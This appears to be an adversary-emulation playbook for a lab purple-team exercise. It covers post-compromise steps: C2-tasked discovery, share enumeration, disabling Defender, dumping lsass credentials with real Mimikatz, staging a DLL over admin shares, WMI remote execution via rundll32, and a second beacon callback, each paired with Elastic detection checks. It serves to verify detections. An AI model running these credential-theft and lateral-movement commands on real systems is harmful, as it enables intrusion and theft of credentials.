# C0015 — Phase-2 Attack Playbook S4→S9 (payloads + step-by-step)

Executor-grade playbook for the **operator phase** (phase 2) of the campaign: S4 full discovery → S5 share
artifact → S6 target decision → S7 auth controls → S8 WMI lateral → S9 second session. Every step lists the
**payload** used, the **machine**, the exact **commands** and the **evidence to confirm** (Elastic +
server log), plus rollback. Companion docs: `docs/attack-runbook.md` (compact S1–S15), `docs/implementation-plan.md`
(blueprint + M-1 gates), `docs/phase2-detection-prep-s4-s9.md` (detection verification skeletons).

All behavior is **benign surrogate on owned VMs** (per labels `[LAB-SURROGATE]`). Operator works interactively;
credentials only via prompt/runas — never on a command line or in logs.

## 0. Preflight & payload build (on C2 host + VMs)

| Check | Command / note | Gate |
|---|---|---|
| Repo HEAD | `git pull` and confirm `git log -1` matches the reviewed commit | — |
| wmic on WS01 | `where wmic` (absent on 24H2+ → use CIM fallback, record `PARTIAL`) | M-1 |
| `it.admin` local admin on FS01 | `runas /user:C0015\it.admin "cmd /c whoami /groups"` (needs admin on target for WMI Create) | M-1 |
| it.admin local admin on **WS01** (SeDebugPrivilege for S7b) | same `runas ... whoami /groups` on WS01 → add to local Administrators if missing ([LAB CONFIG]) | M-1 |
| Sysmon BALANCED on WS01+FS01 | `& C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-balanced.xml` (E7 scope includes `C:\C0015\`) | M-1 |
| Defender off (lab config) | `Set-MpPreference -DisableRealtimeMonitoring $true` (+ observe 5001/1151) | — |
| Audit | 4624/4625/4648/4672/4688 success+failure; S4688 with process command line | M-1 |

**Payloads needed (this phase):**
| Payload | Source | Build / stage |
|---|---|---|
| Session-1 chain (S1–S3 re-run) | `payloads/hta/bootstrap.hta`, `payloads/beacon/c0015_beacon.ps1`, `payloads/dll/c0015_bootstrap_dll.c`, `payloads/docm/macro_payload.vba` | `payloads/packaging/build_dll.sh` → `build/out/c0015-comparefor.jpg`; `make_config.ps1` (full task map) |
| **143.dll surrogate (S8/S9)** — NEW | `payloads/dll/c0015_143_surrogate.c` | `x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi` (on Kali) |
| Mimikatz-shaped LSASS surrogate (**fallback for S7b**) | `payloads/lsass/c0015_mimikatz_surrogate.c` | only if real Mimikatz deployment is blocked: `x86_64-w64-mingw32-gcc -O2 -o mimikatz.exe payloads/lsass/c0015_mimikatz_surrogate.c -luser32` (Kali) → `C:\Tools\mimikatz.exe` on WS01 |
| phase7 config (FS01) | `payloads/config/c0015-phase7.example.ini` → fill `run_id` | staged to `C:\C0015\config-phase7.ini` in S8a |
| C2-SIM v3 | `scripts/c2sim_v2.py` — dynamic tasking via `POST /cmd` (operator benign commands; queue priority) + phase3 batch + phase7-session2 receipt | `python scripts/c2sim_v2.py --ip 192.168.50.1 --port 8080 --ledger evidence/run-ledger --log c2sim.log` |

**Run identity:** use ONE new `run_id` (RUN-YYYYMMDD-NN) for this pass so S1→S9 share it (E2E continuity).
Phase-1's session-1 beacon is closed — **re-establish session 1 under the new run_id first (Step 1)**.
Replace every `RUN-20260928-02` placeholder below with this actual run_id (artifacts + c2sim `run=`).

## 1. Re-establish session 1 (S1→S3) with FULL discovery task map

> Phase-1 lesson (ledger RUN-20261001-01): the deployed `config.ini` mapped only 3 tasks and the beacon fell back
> to `cmd /c ver` for T-DISCOVER-SYSTEM / -DOMAINGROUPS. **Regenerate the config with the current `make_config.ps1`
> (8 discovery tasks, `loop_count=12`) and re-stage.**

C2 host:
```powershell
mkdir -p stage/ws01
pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-20260928-02 -C2Host 192.168.50.1 -OutPath stage/ws01/config.ini
cp payloads/hta/bootstrap.hta payloads/beacon/c0015_beacon.ps1 stage/ws01/
pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out   # :8080 C2 + :8000 HTTP
```
WS01 (duc.user):
```powershell
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source C:\stage   # config.ini + hta + beacon
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba
# open test.docm ONCE (Enable Content)
```
Verify: `c2sim.log` shows `register stage=phase3 host=WS01 ok=True (registered)` (ONE, dedup otherwise);
markers `b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`, `dll-executed.txt`.

## 1a. IT logon seed (S0) — "an admin logged into WS01 in the past" (mythbusts "how did the admin cred get in lsass?")

Lab limitation: lsass only holds logon sessions that are ALIVE at dump time (a session ends when all its processes
exit; nothing survives a reboot). So the "past admin logon" is materialised as a real, KEPT-ALIVE it.admin session
on WS01 created **before the attack pass** ([LAB-SEED]; the attack narrative simply assumes IT logged on earlier).
With this seed, the S7b mimikatz dump being self-consistent and finds it.admin in real lsass data — no need to
pretend the operator already knew the password.

WS01 (operator as IT; keep open until after S7b):
```powershell
runas /user:C0015\it.admin "cmd /c ping -t 127.0.0.1"   # type-8 logon; password at prompt; Ctrl+C at cleanup
# or: RDP/interactive console session logged in as it.admin; or a scheduled task as it.admin
```
Verify: WS01 **S4648** + **E1 cmd.exe (parent = runas)**, process stays alive.

## 2. S4 — operator-driven discovery (WS01, parent = beacon session-1 PID)

C2-SIM v3 lets the operator **drive the beacon like a real C2 operator**: enqueue any benign command via
`POST /cmd` (the queue takes priority), or let the fixed DFIR batch run. Default batch order: CORPUS, SYSTEM,
DOMAINGROUPS, LOCALGROUPS, TRUSTS, NETVIEWALL, TIME, PING, then T-BEACON-SLEEP idle.

Operator console (C2 host; token from the `c2sim.log` register line):
```powershell
$tok = "S1-…"; $c2 = "http://192.168.50.1:8080"
# task a single benign command — the beacon runs it on WS01 (parent chain preserved)
Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "net view /all"
Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "tasklist /s localhost"
# micro-manage the burst like the DFIR operator; typo/copy-paste variation is itself a
# runbook signature (seen in the source), so vary the command strings on purpose
Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "net group `"domain admins`" /dom"
# ...or let the ORDERED kill chain play through the beacon sequentially (v3.1 runbook):
Invoke-RestMethod -Method Post -Uri "$c2/runbook?session=$tok&name=c0015-phase2"
```
Results appear as `result ... task=OP-CMD ...` in `c2sim.log`; the beacon sleeps
`loop_sleep_sec ± loop_sleep_jitter_sec` between rounds (v3 cadence). Raise `loop_count` while shepherding.

Verify (C2 host + Elastic):
```powershell
Get-Content c2sim.log -Tail 30          # expect 8 task/next + 8 result accepted (bytes per command)
powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinutes 30 -OutPath C:\Users\Public\c0015-evidence.json
```
Elastic (skeleton): `host.name:"ws01" and event.code:1 and process.parent.name:"powershell.exe" and process.name:("net.exe" or "net1.exe" or "tasklist.exe" or "nltest.exe")` — **verify each `process.command_line` matches the tasked command** (T1135 net view /all; T1057 tasklist /s; T1069.002 net group /dom; T1069.001 net localgroup; T1482 nltest /domain_trusts; T1018 net view /domain + ping; T1124 net view time). Any `cmd /c ver` = fallback (config map broken → stop, fix config map).
Ledger: S4 `VERIFIED IN REPO` (8/8) + E1 record_ids + c2sim results.

## 3. S5 — ShareFinder → `ART-04-01` (WS01, `duc.user`)

Payload: none new (PowerShell + `scripts/lab_tools.py`).
```powershell
net view \\FS01
Get-SmbShare | Out-File C:\ProgramData\found_shares.txt          # mirror DFIR staging path ([LAB ASSUMPTION])
```
Then on the C2 host, build the structured artifact (payload JSON lists readable shares incl. `FS01\Finance`):
```powershell
python scripts/lab_tools.py artifact-new ART-04-01 RUN-20260928-02 5 6 --payload stage/ws01/found_shares.json -o stage/ws01/art04_01.json
```
Evidence: WS01 E1 (net/powershell), E11 `found_shares.txt`, FS01 S5145 (if probed), `ART-04-01` sha256.
Optional (keeps a DIRECT beacon link): task `powershell -c Get-SmbShare` via `/cmd` → E1 parent = beacon powershell;
otherwise correlate by user/host/window + artifact hash (see §8b map).
Rollback: delete `C:\ProgramData\found_shares.txt`.

## 4. S6 — target decision → `ART-04-02` (C2 host, orchestration)

Reads `ART-04-01` content (readable → high-value), derives target = **FS01**, writes selection_reason (never
hard-coded), allowed_actions per `docs/implementation-plan.md`:
```powershell
python scripts/lab_tools.py artifact-new ART-04-02 RUN-20260928-02 6 8 --payload stage/ws01/target-manifest.json -o stage/ws01/art04_02.json
```
Evidence: ledger step (read_artifact = ART-04-01; selection_reason). No endpoint telemetry.

## 5. S7 — auth controls (WS01 → FS01, explicit credential)

Payload: none (native logon controls). `ART-04-02.auth.account` = `it.admin` (pre-provisioned; **password via
prompt only**).
```powershell
net use \\FS01\IPC$ /user:C0015\duc.user *      # A. DENIED  -> error 5 (S4625)
net use \\FS01\IPC$ /user:C0015\it.admin *      # B. ALLOWED -> OK (S4624 T3 + S4672 control proof)
net use /delete \\FS01\IPC$
net use \\FS01\IPC$ /user:C0015\<revoked> *     # C. REVOKED -> denied
net use /delete \\FS01\IPC$
```
Record **`ART-05-01`** (auth evidence bundle: S4648/S4624/4672 refs + LogonId) — evidence only, never control
input for S8:
```powershell
python scripts/lab_tools.py artifact-new ART-05-01 RUN-20260928-02 5 6 --payload stage/ws01/auth-bundle.json -o stage/ws01/art05_01.json
```
Elastic: WS01 S4648 (explicit credential); FS01 S4624 T3 + S4672 joined by **FS01 LogonId** (never 4648↔4624 by
LogonId); S4625 for A/C. Note: the IPC$ session does **not** change the process token — S8b must re-supply the
credential explicitly.

## 5b. S7b — credential access (REAL Mimikatz on WS01 lsass; operator-driven)

Payload: **real Mimikatz** from [ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz) — clone on the attacker
host, verify the binary before deployment, copy `x64\mimikatz.exe` → `C:\Tools\mimikatz.exe` on WS01.
(Our `payloads/lsass/c0015_mimikatz_surrogate.c` remains a **fallback** when deployment of the real tool is blocked.)

Preconditions (preflight gates):
- **`it.admin` ∈ local Administrators on WS01** (SeDebugPrivilege) — without it, opening lsass fails (real negative
  telemetry, but the chain needs the grant). Verify `runas /user:C0015\it.admin "cmd /c whoami /groups"`.
- **LSASS data exists on WS01**: an it.admin logon session must be anchored on WS01 first — S7 already creates it
  (`net use \\FS01\IPC$ /user:it.admin` = network logon on WS01). Optional richer session:
  `runas /user:C0015\it.admin "cmd /c whoami"` (type-8 logon).

> **Why is it.admin in WS01's lsass?** A credential only lives in the lsass of the machine where that logon
> OCCURRED. Authenticating as it.admin FROM WS01 (net use / runas) anchors it.admin's material (Kerberos/NTLM) in
> WS01's lsass — it can never appear there "by itself". DFIR attributes the harvest to Process Hacker/LSASS
> (`[INFERRED-C0015]`, provenance `[UNKNOWN-C0015]`); the lab reproduces the same mechanism self-consistently:
> **S7 plants the session → S7b harvests it → S8 uses the identity**.

Run (password at the runas prompt only, never on the command line / logs):
```powershell
runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
```
Guardrails (lab boundary, recorded in `docs/attack-chain-plan.md` §10):
- The dump/console output **stays on the VM**: no `lsass.dmp`/output file written to disk, nothing copied into the
  repo, ledger, logs or this playbook; close the window after the run.
- The WMI identity at S8 remains the operator-provided prompt (the lab's own provisioned password) — the harvested
  values are never consumed or stored outside the run.

Evidence: WS01 **S4648** (explicit credential), **E1 `mimikatz.exe`** (parent = `cmd.exe` via runas),
**E10 ProcessAccess target `lsass.exe`** (real high GrantedAccess from the elevated token), output in the runas
console only. `c2sim.log` contains NO mimikatz line (operator-driven, outside the beacon).
Rollback: delete `C:\Tools\mimikatz.exe`.

## 6. S8a — tool handoff (T1570 surrogate; WS01 → FS01 C$)

Payload: `c0015_143_surrogate.dll` (build from Step 0) + `c0015_beacon.ps1` + `config-phase7.ini`.
```powershell
# put the session-2 files on FS01 (beacon script + config phase7 + the DLL)
copy c0015_143_surrogate.dll \\FS01\C$\C0015\
copy payloads\beacon\c0015_beacon.ps1 \\FS01\C$\C0015\
copy stage\ws01\config-phase7.ini \\FS01\C$\C0015\config-phase7.ini   # run_id filled
```
Evidence (FS01): S5140/S5145 (admin share), E11 TargetFilename `C:\C0015\…`; hash continuity
(local sha256 == FS01 E7 hash at S9).
Rollback: delete `\\FS01\C$\C0015\*`.

## 7. S8b — WMI remote process creation (T1047; WS01, explicit `it.admin`)

Primary (keeps wmic telemetry — `runas` prompts the password, never on the command line):
```powershell
runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
```
Fallback (no wmic build → telemetry is powershell, record `PARTIAL`):
```powershell
$cred = Get-Credential C0015\it.admin
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred `
  -Arguments @{ CommandLine = 'rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry' }
```
Record **`ART-06-01`** (FS01 E1 `wmiprvse → rundll32` + DLL sha256 + LogonId):
```powershell
python scripts/lab_tools.py artifact-new ART-06-01 RUN-20260928-02 6 7 --payload stage/ws01/remote-process.json -o stage/ws01/art06_01.json
```
Gate (all four, same run_id): (1) process on FS01 `rundll32`, (2) identity = S4648 + FS01 S4624/4672 **same FS01
LogonId** matching `it.admin`, (3) which process + DLL hash = `ART-06-01`, (4) callback at S9.
Elastic: FS01 E1 `process.name:"rundll32.exe" and process.parent.name:"wmiprvse.exe"`; S4624 T3 + S4672.

## 8. S9 — second session (automatic after S8b; FS01 + C2 host)

The 143 DLL writes `C:\C0015\c0015_143-executed.txt` and spawns the beacon → register
`stage=phase7-session2 host=FS01 token=S2-…` → C2-SIM serves `T-DISCOVER-CORPUS` and writes the server-side
receipt:
```powershell
Get-ChildItem evidence/run-ledger | Sort-Object LastWriteTime | Select-Object -Last 5   # ART-07-01-<token8>.json
Get-Content c2sim.log -Tail 10                                                          # phase7 register ok=True
```
Elastic (FS01): E1 rundll32 (same ProcessGuid as S8b), **E7 ImageLoad `C:\C0015\c0015_143_surrogate.dll`**
(sha256 = ART-06-01; BALANCED covers `C:\C0015\`), E11 `c0015_143-executed.txt` / token file, E3 →
`192.168.50.1:8080` (record ProcessGuid attribution).
**Acceptance: server-side `ART-07-01` receipt + FS01 callback telemetry in the same run — a marker/DLL present is
NOT sufficient.** Injection (S9b) is analysis/replay only; never performed.

## 8b. Chain correlation map — S1→S9 (phase 1 + phase 2 in one pass)

| Hop | Link points (same run_id) | Correlation tier |
|---|---|---|
| S1→S2→S3 (phase 1, re-run this pass) | WINWORD `…3808` → mshta `…3908` → regsvr32 `…3c08` → beacon `…3d08` (ProcessGuid, WS01) | DIRECT EVENT LINK |
| S3→S4 | beacon `…3d08` → cmd/net/tasklist children `…3f08/4008/…` (OP-CMD or batch; verify `command_line`) | DIRECT EVENT LINK |
| S4→S5 | net view/Get-SmbShare. **Beacon-run** (`/cmd`) → E1 parent = beacon (DIRECT); **operator-interactive** → correlate by `user.name`+host+window + `ART-04-01` hash (SUPPORTED) | DIRECT / SUPPORTED |
| S5→S6 | orchestrator reads `ART-04-01` → `ART-04-02` (selection_reason from content) | SUPPORTED PHASE HANDOFF |
| S6→S7 | `ART-04-02.auth.account` → S7 controls | SUPPORTED |
| S7 (plant it.admin on WS01) | WS01 S4648 (explicit) → (next phase) FS01 S4624 T3 + S4672 on **FS01 LogonId** | DIRECT per key pair; never 4648↔4624 by LogonId |
| S7b (harvest) | E10 lsass (elevated mimikatz, runas-parented). Correlate to S7/DFIR-line by S4648 + identity + window — NOT ProcessGuid-linked to the beacon | SUPPORTED / TEMPORAL-CONTEXTUAL |
| S7b→S8 | same identity anchor (runas it.admin) → S4648 again + FS01 4624/4672 | SUPPORTED |
| S8 (WMI) | WS01 S4648 → FS01 S4624/4672 (FS01 LogonId) + FS01 E1 `wmiprvse → rundll32` + DLL hash = `ART-06-01` (4-gate) | DIRECT per key pair |
| S8→S9 | FS01 rundll32 **same ProcessGuid** → E7 (hash = ART-06-01) → E3 `:8080` → server `ART-07-01` receipt | DIRECT + SUPPORTED (receipt) |

Continuity rules: **same `run_id` threads S1→S9** (ledger + every artifact + c2sim `run=`); ProcessGuid joins stay
same-host; the phase-1-verified `RUN-20261001-01` is a SEPARATE run and is never merged with this pass's chain (per
`docs/correlation-architecture.md` §4 — events from different runs are never merged; cross-run comparison is
ledger-level only, e.g. E7 hash parity `CEF7879F…`/`ART-01-03`). Steps S5/S7/S7b/S8 are operator-driven and
correlate at `SUPPORTED`/`DIRECT` via auth anchors + artifacts, not via a single ProcessGuid spine.

## 9. Verify the phase-2 run (detection side)

- Reuse `docs/phase2-detection-prep-s4-s9.md` skeletons: per-stage KQL (S5 5145, S7 4648/4624/4672 on FS01
  LogonId, S8 `wmiprvse → rundll32` EQL, S9 E7/E3) and the run-time gap checklist
  (`winlog.logon.id` mapping, E3 attribution, wmic/CIM variant, clock).
- Cross-check every claim against `c2sim.log` + ledger artifacts; statuses stay in the allowed vocabulary
  (`VERIFIED IN REPO` / `PARTIAL` / `SENSOR GAP` / `INGEST/MAPPING GAP`).

## Cleanup (after each run)

```powershell
pwsh -File payloads/packaging/launch_servers.ps1 -Stop
Remove-Item -Recurse -Force C:\Users\Public\C0015 ; Remove-Item "$env:USERPROFILE\Desktop\test.docm" -Force   # WS01
Remove-Item -Recurse -Force C:\C0015                                                             # FS01
# Re-enable Defender + restore routine Sysmon profile.
```

## Status expectations (this pass)

| Stage | Payload | Expected ledger status |
|---|---|---|
| S1–S3 (re-run) | phase-1 chain | VERIFIED IN REPO |
| S4 | beacon + C2-SIM batch | VERIFIED (8/8) |
| S5 | PowerShell + lab_tools | VERIFIED (ART-04-01 + hash) |
| S6 | lab_tools | VERIFIED (ART-04-02 provenance) |
| S7 | native logon controls | VERIFIED (A/C denied, B allowed; LogonId linked) |
| S8 | `c0015_143_surrogate.dll` | VERIFIED (4-gate) |
| S9 | 143 + beacon phase7 | VERIFIED only with ART-07-01 + callback |